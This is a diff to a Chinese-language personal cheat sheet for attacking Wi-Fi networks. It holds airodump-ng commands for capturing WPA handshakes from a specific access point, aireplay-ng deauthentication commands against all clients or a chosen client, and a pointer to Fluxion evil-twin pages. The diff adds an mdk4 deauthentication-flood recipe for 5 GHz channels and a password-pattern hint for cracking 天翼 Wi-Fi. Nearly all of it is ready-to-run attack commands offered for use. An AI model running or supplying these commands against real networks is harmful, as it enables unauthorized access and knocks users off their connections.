@@ -15,7 +15,7 @@ airodump-ng wlan0  # 扫描 wifi
 # 60:32:B1:56:3F:B2  CC:08:FB:DD:42:18
 
 # 只用此方式抓包较慢
-airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/lingdu/handshake wlan0
+airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/kali/tmp/handshake wlan0
 
 # 第一行 CH  9 ][ Elapsed: 27 s ][ 2023-01-14 22:40 ][ WPA handshake: 34:36:54:D8:1F:A9 # 显示 handshake 为攻击成功, 这时Ctrl+C退出命令
 ```
@@ -23,6 +23,9 @@ airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/lingdu/handshake wlan0
 ACK方式
 ```sh
 # 方式1 上面的不要关闭 执行下面
+## 针对所有客户端
+aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 wlan0
+## 针对指定客户端
 aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c CC:08:FB:DD:42:18 wlan0
 # 方式2 停止扫描， 执行攻击， 马上开启扫描。
 # -0: 通知设备断开连接 10: 攻击次数 -a:目标bssid -c: 目标踢下线的设备
@@ -50,6 +53,23 @@ https://github.com/FluxionNetwork/fluxion
 # 2 仿真（断开原网络的选项 需要测试，不确定效果）
 # 认证页面 选3中文。 (如果确认对方路由器也可选别的)
 ```
+
+## 8812AU网卡使用 5G攻击
+```sh
+#MDK4攻击：
+iwconfig wlan0 mode monitor
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng -C 5180-5885 wlan0
+# -C <freq>[,<freq>[,...]]
+
+airodump-ng -w fhfgd -c 信道 --bssid MAC地址 wlan0
+
+#再打开一个终端
+mdk4 wlan0 d -B MAC地址
+mdk4 wlan0 d -c 36,40,44,48,149,153,157,161,165
+```
+
 ## Dictionary
 
 天翼wifi:8位数字密码，例如 xx4yyykw
